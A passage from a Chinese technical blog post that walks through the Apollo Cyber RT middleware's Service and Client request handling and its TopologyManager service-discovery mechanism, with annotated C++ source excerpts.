<code>Receiver</code> 对象，这部分我在<a href="https://dingfen.github.io/apollo/2020/11/07/CyberCommu2.html#transport">这里</a>也讨论过了。需要注意的是传入的 <code>MessageListener</code> ，即那个复杂的 Lambda 表达式，其内部又套了一个 Lambda 表达式。<code>MessageListerner</code> 这个回调函数会在 <code>Receiver</code> 接收到新消息后被调用。其动作是：建立一个函数 <code>task</code> ，<code>task</code> 函数调用 <code>HandleRequest()</code> 函数对消息进行处理，然后将 <code>task</code> 入队列。简单地说，就是每当一个新消息到来，就会创建一个针对该消息的处理函数，然后把它放入到任务队列中。</p></li><li><p>创建线程，开始运行 <code>Process()</code> 函数。</p></li></ol><p>很自然地，你会好奇 <code>Process()</code> 函数是如何运作的，其实很简单，就是维护了一个先进先出的任务队列。程序中的<a href="http://www.cplusplus.com/reference/condition_variable/condition_variable/">条件变量</a>会不断地检查 <code>!inited_ || !this-&gt;tasks_.empty()</code> 这个布尔值，一旦为真，那就 unblock 自己，从任务队列的最前端取出任务并运行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">void</span> Service&lt;Request, Response&gt;::<span class="hljs-built_in">Process</span>() &#123;<br>  <span class="hljs-keyword">while</span> (!cyber::<span class="hljs-built_in">IsShutdown</span>()) &#123;<br>    <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">ul</span><span class="hljs-params">(queue_mutex_)</span></span>;<br>    condition_.<span class="hljs-built_in">wait</span>(ul, [<span class="hljs-keyword">this</span>]() &#123; <span class="hljs-keyword">return</span> !inited_ || !<span class="hljs-keyword">this</span>-&gt;tasks_.<span class="hljs-built_in">empty</span>(); &#125;);<br>    <span class="hljs-keyword">if</span> (!inited_)<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> (!tasks_.<span class="hljs-built_in">empty</span>()) &#123;<br>      <span class="hljs-keyword">auto</span> task = tasks_.<span class="hljs-built_in">front</span>();<br>      tasks_.<span class="hljs-built_in">pop_front</span>();<br>      ul.<span class="hljs-built_in">unlock</span>();<br>      <span class="hljs-built_in">task</span>();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后，<code>HandleRequest()</code> 函数要做什么呢？<code>Service</code> 是如何处理接收到的请求呢？:point_down:在下面的代码中：</p><ol><li>创建一个 <code>Response</code> 对象，并执行 <code>service_callback_</code> 函数，如前所述，该函数在构造时就已经传入</li><li>用 copy 构造函数创建一个 <code>MessageInfo</code> ，然后更新发送者的 id</li><li>调用 <code>SendResponse()</code> 函数</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Request, <span class="hljs-keyword">typename</span> Response&gt;<br><span class="hljs-type">void</span> Service&lt;Request, Response&gt;::<span class="hljs-built_in">HandleRequest</span>(<br>    <span class="hljs-type">const</span> std::shared_ptr&lt;Request&gt;&amp; request,<br>    <span class="hljs-type">const</span> transport::MessageInfo&amp; message_info) &#123;<br>  <span class="hljs-comment">/* .... */</span><br>  <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lk</span><span class="hljs-params">(service_handle_request_mutex_)</span></span>;<br>  <span class="hljs-keyword">auto</span> response = std::<span class="hljs-built_in">make_shared</span>&lt;Response&gt;();<br>  <span class="hljs-built_in">service_callback_</span>(request, response);<br>  <span class="hljs-function">transport::MessageInfo <span class="hljs-title">msg_info</span><span class="hljs-params">(message_info)</span></span>;<br>  msg_info.<span class="hljs-built_in">set_sender_id</span>(response_transmitter_-&gt;<span class="hljs-built_in">id</span>());<br>  <span class="hljs-built_in">SendResponse</span>(msg_info, response);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SendResponse()</code> 函数也是十分简单，它只是将 <code>Response</code> 对象通过 <code>Transmit()</code> 函数发送出去。这往后的技术细节我就不再讨论了，不过要注意的是，<code>response_transmitter_</code> 的类型是 <code>RtpsTransmitter</code> ，如果你想往下研究的话，只需要看这个类的 <code>Transmit()</code> 函数就可以了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Request, <span class="hljs-keyword">typename</span> Response&gt;<br><span class="hljs-type">void</span> Service&lt;Request, Response&gt;::<span class="hljs-built_in">SendResponse</span>(<br>    <span class="hljs-type">const</span> transport::MessageInfo&amp; message_info,<br>    <span class="hljs-type">const</span> std::shared_ptr&lt;Response&gt;&amp; response) &#123;<br>   <span class="hljs-comment">/*  ....   */</span><br>    response_transmitter_-&gt;<span class="hljs-built_in">Transmit</span>(response, message_info);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Client">Client</h3><p><code>Client</code> 类的实现与 <code>Service</code> 类有很多相似的地方，但也有很多不同。<code>Client</code> 类继承了 <code>ClientBase</code> 类，与 <code>ServiceBase</code> 类似，<code>ClientBase</code> 也就是个接口。<code>Client</code> 类的成员与 <code>Service</code> 的有点镜像关系 :joy:，也有很多不同。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Request, <span class="hljs-keyword">typename</span> Response&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> : <span class="hljs-keyword">public</span> ClientBase &#123;  <br>  std::string node_name_;<span class="hljs-comment">// 创建客户的节点名称</span><br>  std::function&lt;<span class="hljs-type">void</span>(<span class="hljs-type">const</span> std::shared_ptr&lt;Response&gt;&amp;,<br>      <span class="hljs-type">const</span> transport::MessageInfo&amp;)&gt; response_callback_;<span class="hljs-comment">// 应答回调函数</span><br><br>  std::unordered_map&lt;<span class="hljs-type">uint64_t</span>,<br>                     std::tuple&lt;SharedPromise, CallbackType, SharedFuture&gt;&gt;<br>      pending_requests_;  <span class="hljs-comment">// 正在提交的请求</span><br>  std::shared_ptr&lt;transport::Transmitter&lt;Request&gt;&gt; request_transmitter_;<span class="hljs-comment">// 请求的写者</span><br>  std::shared_ptr&lt;transport::Receiver&lt;Response&gt;&gt; response_receiver_;<span class="hljs-comment">// 应答的读者</span><br>  std::string request_channel_;<span class="hljs-comment">// 请求“信道”</span><br>  std::string response_channel_;<span class="hljs-comment">// 应答“信道”</span><br>  transport::Identity writer_id_;<span class="hljs-comment">// 写者 id</span><br>  <span class="hljs-type">uint64_t</span> sequence_number_;<span class="hljs-comment">// 序列号</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>与 <code>Service</code> 有明显不同的是，<code>Client</code> 多了 <code>pending_requests_</code> 表，其类型也十分复杂：<code>std::unordered_map&lt;uint64_t, std::tuple&lt;SharedPromise, CallbackType, SharedFuture&gt;&gt;</code>，它的含义是正在提交的请求，该成员与发出请求和接收应答的过程密切相关。</p><p>现在让我们先来看一下 <code>Client::Init()</code> 函数，代码有点长，因而略去了一些不重要的东西：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Request, <span class="hljs-keyword">typename</span> Response&gt;<br><span class="hljs-type">bool</span> Client&lt;Request, Response&gt;::<span class="hljs-built_in">Init</span>() &#123;<br>    <span class="hljs-comment">/*  RoleAttribute 的赋值 初始化  */</span><br>  <span class="hljs-keyword">auto</span> transport = transport::Transport::<span class="hljs-built_in">Instance</span>();<br>  request_transmitter_ =<br>      transport-&gt;<span class="hljs-built_in">CreateTransmitter</span>&lt;Request&gt;(role, proto::OptionalMode::RTPS);<br>  writer_id_ = request_transmitter_-&gt;<span class="hljs-built_in">id</span>();<br><br>  response_callback_ =<br>      std::<span class="hljs-built_in">bind</span>(&amp;Client&lt;Request, Response&gt;::HandleResponse, <span class="hljs-keyword">this</span>,<br>                std::placeholders::_1, std::placeholders::_2);<br> <span class="hljs-comment">/*  ....   */</span><br>  response_receiver_ = transport-&gt;<span class="hljs-built_in">CreateReceiver</span>&lt;Response&gt;(<br>      role,<br>      [=](<span class="hljs-type">const</span> std::shared_ptr&lt;Response&gt;&amp; response,<br>          <span class="hljs-type">const</span> transport::MessageInfo&amp; message_info,<br>          <span class="hljs-type">const</span> proto::RoleAttributes&amp; reader_attr) &#123;<br>        (<span class="hljs-type">void</span>)message_info;<br>        (<span class="hljs-type">void</span>)reader_attr;<br>        <span class="hljs-built_in">response_callback_</span>(response, message_info);<br>      &#125;,<br>      proto::OptionalMode::RTPS);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client::Init()</code> 函数做的事情好像和 <code>Service::Init()</code> 的差不多，就简单说一下：</p><ol><li><p>判断是否已经初始化，并将 RoleAttribute 的值填充好</p></li><li><p>通过 <code>Transport</code> 类创建 <code>Transmitter</code> 对象，用于发送请求</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">CreateTransmitter</span>&lt;Request&gt;(role, proto::OptionalMode::RTPS);<br></code></pre></td></tr></table></figure><p>注意到，这边的通信渠道依然是 RTPS</p></li><li><p>创建应答回调函数 <code>response_callback_</code>，并与 <code>HandleResponse()</code> 函数做了绑定</p></li><li><p>创建 <code>Receiver</code> 对象，仍然要注意那个 Lambda 表达式，该函数直接调用了 <code>response_callback_</code> 回调函数。回顾我在<a href="https://dingfen.github.io/apollo/2020/11/07/CyberCommu2.html#receiver--transmitter-1">这里</a>讨论过的 <code>OnNewMessage()</code> 函数，<code>Receiver</code> 会在接收到新的应答后立即调用 <code>response_callback_</code>，这就是证明我所言的最直接的证据</p></li></ol><p>从 <code>Init()</code> 函数中，可以了解到，<code>Client</code> 在接收到 Response 后，会调用 <code>HandleResponse()</code> 对 Response 进行处理，让我们快速过一遍：</p><ol><li>检查请求是否由该 <code>Client</code> 对象发出</li><li>从 <code>MessageInfo</code> 中获得序列号。有趣的是，这个序列号实际上是 <code>Client</code> 自己给的，仔细看一下， <code>MessageInfo</code> 发送到 <code>Service</code> 后，<code>Service</code> 只改变了它的发送者 id，然后就立马将它塞入 Response 中传回</li><li>根据序列号，从 <code>pending_request_</code> 获得消息，然后执行操作：将得到的应答消息放入 <code>std::promise</code> 中，然后调用回调函数，处理这个消息。如果你对 C++ 的多线程不太熟悉，建议猛戳<a href="http://www.cplusplus.com/reference/future/promise/">此链接</a></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">void</span> Client&lt;Request, Response&gt;::<span class="hljs-built_in">HandleResponse</span>(<br>    <span class="hljs-type">const</span> std::shared_ptr&lt;Response&gt;&amp; response,<br>    <span class="hljs-type">const</span> transport::MessageInfo&amp; request_header) &#123;<br>  <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(pending_requests_mutex_)</span></span>;<br>  <span class="hljs-comment">// 检查请求是否是该client发出的</span><br>  <span class="hljs-keyword">if</span> (request_header.<span class="hljs-built_in">spare_id</span>() != writer_id_)<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-comment">// 从请求 消息中获得序列号</span><br>  <span class="hljs-type">uint64_t</span> sequence_number = request_header.<span class="hljs-built_in">seq_num</span>();<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>-&gt;pending_requests_.<span class="hljs-built_in">count</span>(sequence_number) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">auto</span> tuple = <span class="hljs-keyword">this</span>-&gt;pending_requests_[sequence_number];<br>  <span class="hljs-keyword">auto</span> call_promise = std::<span class="hljs-built_in">get</span>&lt;<span class="hljs-number">0</span>&gt;(tuple);<br>  <span class="hljs-keyword">auto</span> callback = std::<span class="hljs-built_in">get</span>&lt;<span class="hljs-number">1</span>&gt;(tuple);<br>  <span class="hljs-keyword">auto</span> future = std::<span class="hljs-built_in">get</span>&lt;<span class="hljs-number">2</span>&gt;(tuple);<br>  <span class="hljs-keyword">this</span>-&gt;pending_requests_.<span class="hljs-built_in">erase</span>(sequence_number);<br>   <span class="hljs-comment">// 放入应答消息，并调用回调函数</span><br>  call_promise-&gt;<span class="hljs-built_in">set_value</span>(response);<br>  <span class="hljs-built_in">callback</span>(future);<br>&#125;<br></code></pre></td></tr></table></figure><p>看完了应答消息的处理，再来看一下 <code>Client</code> 如何发送请求。在 <code>SendRequest</code> 函数中，变量 <code>future</code> 在发送了一个异步请求后，会等待一定时间（默认为 5 秒），期待接收到一个应答。这其中涉及到 <code>AsyncSendRequest</code> 函数，它先创建了一个 <code>MessageInfo</code>，然后将它和 Request 通过 <code>Transmitter</code> 发送出去，之后就是建立一个 tuple，把在“未来”会接收到的消息提前布局在了成员变量 <code>pending_request_</code> 中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Request, <span class="hljs-keyword">typename</span> Response&gt;<br><span class="hljs-keyword">typename</span> Client&lt;Request, Response&gt;::SharedResponse<br>Client&lt;Request, Response&gt;::<span class="hljs-built_in">SendRequest</span>(SharedRequest request,<br>                                       <span class="hljs-type">const</span> std::chrono::seconds&amp; timeout_s) &#123;<br> <span class="hljs-comment">/* ....  */</span><br>  <span class="hljs-keyword">auto</span> future = <span class="hljs-built_in">AsyncSendRequest</span>(request);<br>  <span class="hljs-comment">/* ....  */</span><br>  <span class="hljs-keyword">auto</span> status = future.<span class="hljs-built_in">wait_for</span>(timeout_s);<br>  <span class="hljs-keyword">if</span> (status == std::future_status::ready)<br>    <span class="hljs-keyword">return</span> future.<span class="hljs-built_in">get</span>();<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> Request, <span class="hljs-keyword">typename</span> Response&gt;<br><span class="hljs-keyword">typename</span> Client&lt;Request, Response&gt;::SharedFuture<br>Client&lt;Request, Response&gt;::<span class="hljs-built_in">AsyncSendRequest</span>(SharedRequest request,<br>                                            CallbackType&amp;&amp; cb) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsInit</span>()) &#123;<br>    <span class="hljs-function">std::lock_guard&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(pending_requests_mutex_)</span></span>;<br>    sequence_number_++;<span class="hljs-comment">// 序列号自加  创建 MessageInfo</span><br>    <span class="hljs-function">transport::MessageInfo <span class="hljs-title">info</span><span class="hljs-params">(writer_id_, sequence_number_, writer_id_)</span></span>;<br>    request_transmitter_-&gt;<span class="hljs-built_in">Transmit</span>(request, info);<br>     <span class="hljs-comment">// 建立一个 tuple </span><br>    SharedPromise call_promise = std::<span class="hljs-built_in">make_shared</span>&lt;Promise&gt;();<br>    <span class="hljs-function">SharedFuture <span class="hljs-title">f</span><span class="hljs-params">(call_promise-&gt;get_future())</span></span>;<br>    pending_requests_[info.<span class="hljs-built_in">seq_num</span>()] =<br>        std::<span class="hljs-built_in">make_tuple</span>(call_promise, std::forward&lt;CallbackType&gt;(cb), f);<br>    <span class="hljs-keyword">return</span> f;<br>  &#125; <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> std::shared_future&lt;std::shared_ptr&lt;Response&gt;&gt;();<br>&#125;<br><br><span class="hljs-comment">// pending_request_ 类型</span><br>std::unordered_map&lt;<span class="hljs-type">uint64_t</span>,<br>  std::tuple&lt;SharedPromise, CallbackType, SharedFuture&gt;&gt; pending_requests_<br></code></pre></td></tr></table></figure><p>也许上面的只言片语让你感到困惑， <code>pending_request_</code> 到底何方神圣？:point_up_2:综合之前所说的发布请求和应答接收过程，<code>pending_request_</code> 表记录下了正在发送的请求。表中用序列号作为主键，而后面的值是一个 tuple，放入了 <code>std::promise</code> ，它用于放入“未来”接收到的 Response （在 <code>HandleResponse()</code> 中一清二楚），而最后面的 <code>std::future</code> 用于获取它，中间的 <code>CallbackType</code> 则是处理这个 Response 的回调函数。兵马未动粮草先行，在将请求发出后，<code>Client</code> 就准备好了这一系列东西，因而 <code>HandleResponse()</code> 在处理应答时就显得游刃有余，简洁明了:slightly_smiling_face:。当然，因为这是记录正在发送的请求，收到后一定要将它删去。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> tuple = <span class="hljs-keyword">this</span>-&gt;pending_requests_[sequence_number];<br><span class="hljs-keyword">auto</span> call_promise = std::<span class="hljs-built_in">get</span>&lt;<span class="hljs-number">0</span>&gt;(tuple);<br><span class="hljs-keyword">auto</span> callback = std::<span class="hljs-built_in">get</span>&lt;<span class="hljs-number">1</span>&gt;(tuple);<br><span class="hljs-keyword">auto</span> future = std::<span class="hljs-built_in">get</span>&lt;<span class="hljs-number">2</span>&gt;(tuple);<br><span class="hljs-keyword">this</span>-&gt;pending_requests_.<span class="hljs-built_in">erase</span>(sequence_number);<br>call_promise-&gt;<span class="hljs-built_in">set_value</span>(response);<br><span class="hljs-built_in">callback</span>(future);<br></code></pre></td></tr></table></figure><h2 id="服务发现">服务发现</h2><p>让我们回到最初的地方，在 <code>NodeServiceImpl</code> 类创建 <code>Service</code> 完后，服务发现的拓扑管理类 <code>service_discovery::TopologyManager</code> 中的 <code>Join()</code> 函数，会将刚创建的 <code>Service</code> 加入到整个服务发现的拓扑结构中，而在早先时候，我们就遇到过，在 <code>Reader</code> 和 <code>Writer</code> 初始化的最后，会调用到 <code>JoinTheTopology</code> 函数。这些都和服务发现相关，接下来我们就重点聊一聊这部分内容。</p><p>先明确，服务发现不负责具体消息的传递（这些我们已经在之前讲的很清楚了），主要负责监测 cyber RT 中通信节点的情况，并且处理新节点加入或旧节点退出等操作，在其中起主要作用负责的就是 <code>TopologyManager</code> 。</p><p>网络拓扑结构是如何来的？事实上就是节点、信道、读者、写者、服务、客户之间的通信关系的抽象表达。在之前的博客里，我说过 <code>Node</code> 类包含了 <code>Server</code>、<code>Client</code>、<code>Writer</code>、<code>Reader</code> 这四类，而它们可以看做是网络中的顶点，信道就是 <code>Writer</code> 到 <code>Reader</code> 的有向边（因为信息只能从 <code>Writer</code> 传到 <code>Reader</code> ），<code>Service</code> 是 <code>Server</code> 与 <code>Client</code> 的边。Cyber RT 中把 <code>Writer</code> 和 <code>Server</code> 称作 Upstream，另外两个是 Downstream。</p><h3 id="TopologyManager">TopologyManager</h3><p><code>TopologyManager</code> 是个单例，这很明显，因为系统中只需要有一个“监管员”来负责监控网络拓扑就足够了。<code>TopologyManager</code> 有三个子管理器，并有共同的基类 <code>Manager</code>。它们分别为：</p><p>- <code>NodeManager</code> 用于管理网络拓扑中的节点<br>  - <code>ChannelManager</code> 用于管理信道以及 <code>Reader</code> 和 <code>Writer</code><br>  - <code>ServiceManager</code> 用于管理 <code>Service</code> 和 <code>Client</code></p><p>除此之外，它还有其他的成员 :point_down:。</p><ul><li><code>participant_</code> ，意为通信网络中使用 RTPS 的参与者，不要忘了虽然 <code>TopologyManager</code> 监管整个网络，但它也使用 RTPS ，也是其中的一员，该变量就是指 <code>TopologyManager</code> 自身。</li><li><code>participant_listener_</code> 会在之后介绍</li><li><code>change_signal_</code> 类似于 Qt 中的信号槽机制，通过调用 <code>AddChangeListener()</code> 函数， 连接（connect）了相应的监听器，一有风吹草动，就会立马调用它</li><li><code>participant_names_</code> 目前网络中的参与者 rtps::id 与参与者名称对应的表格</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> PartNameContainer =<br>     std::map&lt;eprosima::fastrtps::rtps::GUID_t, std::string&gt;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TopologyManager</span> &#123;<br>  NodeManagerPtr node_manager_;        <span class="hljs-comment">// shared ptr of NodeManager</span><br>  ChannelManagerPtr channel_manager_;  <span class="hljs-comment">// shared ptr of ChannelManager</span><br>  ServiceManagerPtr service_manager_;  <span class="hljs-comment">// shared ptr of ServiceManager</span><br>  <span class="hljs-comment">// rtps participant to publish and subscribe</span><br>  transport::ParticipantPtr participant_;<br>  ParticipantListener* participant_listener_;<br>  ChangeSignal change_signal_;           <span class="hljs-comment">// topology changing signal,</span><br>                                         <span class="hljs-comment">// &lt; connect to `ChangeFunc`s</span><br>  PartNameContainer participant_names_;  <span class="hljs-comment">// other participant in the topology</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>TopologyManager</code> 的初始化非常简单，就是先创建参与者 <code>Participant</code> ，然后初始化 <code>NodeManager</code>、<code>ChannelManager</code> 和 <code>ServiceManager</code>。先说说 <code>Participant</code> 的创建：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TopologyManager::CreateParticipant</span><span class="hljs-params">()</span> </span>&#123;<br>  std::string participant_name =<br>      common::GlobalData::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">HostName</span>() + <span class="hljs-string">&#x27;+&#x27;</span> +<br>      std::<span class="hljs-built_in">to_string</span>(common::GlobalData::<span class="hljs-built_in">Instance</span>()-&gt;<span class="hljs-built_in">ProcessId</span>());<br>  participant_listener_ = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ParticipantListener</span>(std::<span class="hljs-built_in">bind</span>(<br>      &amp;TopologyManager::OnParticipantChange, <span class="hljs-keyword">this</span>, std::placeholders::_1));<br>  participant_ = std::<span class="hljs-built_in">make_shared</span>&lt;transport::Participant&gt;(<br>      participant_name, <span class="hljs-number">11511</span>, participant_listener_);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>看起来很复杂，其实很简单，<code>Participant</code> 的名字从全局变量中的 <code>HostName()</code> 和 <code>ProcessId()</code> 获得。然后就是创建监听器 <code>participant_listener_</code>，它与 <code>OnParticipantChange</code> 绑定，在参与者发生变化时被调用，设置监听的端口为 11511，进而构造出 <code>Participant</code> 对象，该类牵扯的技术细节比较繁琐，我在此不进一步介绍。</p><p>我们关心的是，在参与者发生了变化后（加入、离去），<code>TopologyManager</code> 会做出何种反应？请允许我隆重介绍一下<strong>基于 Fast RTPS 的发现机制</strong><sup>2</sup>。之所以这么起名，是因为这层拓扑监控主要是通过 Fast RTPS 提供的自动发现机制。若进程意外退出，则要将各管理类中相应信息进行更新。优点在于，如果进程出错或设备断开，该机制也可以工作，但粒度比较粗，且不是非常及时（比如断开时）。对于该机制的内容，都在 <code>OnParticipantChange()</code> 函数里了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">TopologyManager::OnParticipantChange</span><span class="hljs-params">(<span class="hljs-type">const</span> PartInfo&amp; info)</span> </span>&#123;<br>  ChangeMsg msg;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Convert</span>(info, &amp;msg))<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-comment">/*  ....  */</span><br>  <span class="hljs-keyword">if</span> (msg.<span class="hljs-built_in">operate_type</span>() == OperateType::OPT_LEAVE) &#123;<br>    <span class="hljs-keyword">auto</span>&amp; host_name = msg.<span class="hljs-built_in">role_attr</span>().<span class="hljs-built_in">host_name</span>();<br>    <span class="hljs-type">int</span> process_id = msg.<span class="hljs-built_in">role_attr</span>().<span class="hljs-built_in">process_id</span>();<br>    node_manager_-&gt;<span class="hljs-built_in">OnTopoModuleLeave</span>(host_name, process_id);<br>    channel_manager_-&gt;<span class="hljs-built_in">OnTopoModuleLeave</span>(host_name, process_id);<br>    service_manager_-&gt;<span class="hljs-built_in">OnTopoModuleLeave</span>(host_name, process_id);<br>  &#125;<br>  <span class="hljs-built_in">change_signal_</span>(msg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>先来看第一步：<code>TopologyManager::Convert()</code> 函数。就是一个数据类型的转换函数，它将 Fast RTPS 中的 <code>ParticipantDiscoveryInfo</code> 也就是参与者的变动信息，包装为 Cyber RT 中所需要的信息类型 <code>ChangeMsg</code>，同时根据消息的类型（加入还是离去），更新 <code>participant_names_</code> 表格。也就是说，现在主要信息源从 <code>info</code> 转移到了 <code>msg</code> 中。</p><p>第二步，如果检查发现该参与者要离去，那么 <code>OnParticipantChange()</code> 会通知三个通信网络的管理器，即调用 <code>OnTopoModuleLeave()</code> 函数，让各自的管理者把将离去的参与者排除在外。而加入的时候就不需要考虑，因为这些参与者在创建时，就会调用相应的函数加入到这个网络中。</p><p>第三步，就是这句话 <code>change_signal_(msg)</code>，<code>change_signal_</code> 的本质就是若干个回调函数组成的列表。这句话就是在调用:point_down:这个函数（为简单，去掉了加锁），将所有的、调用过 <code>AddChangeListener()</code> 函数后与之 connect 的回调函数全部执行，相当于是监听器在监听到变化后，开始工作了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(Args... args)</span> </span>&#123;<br>    SlotList local;    <span class="hljs-comment">// Slot 就相当于一个 std::function</span><br>      <span class="hljs-keyword">for</span> (<span 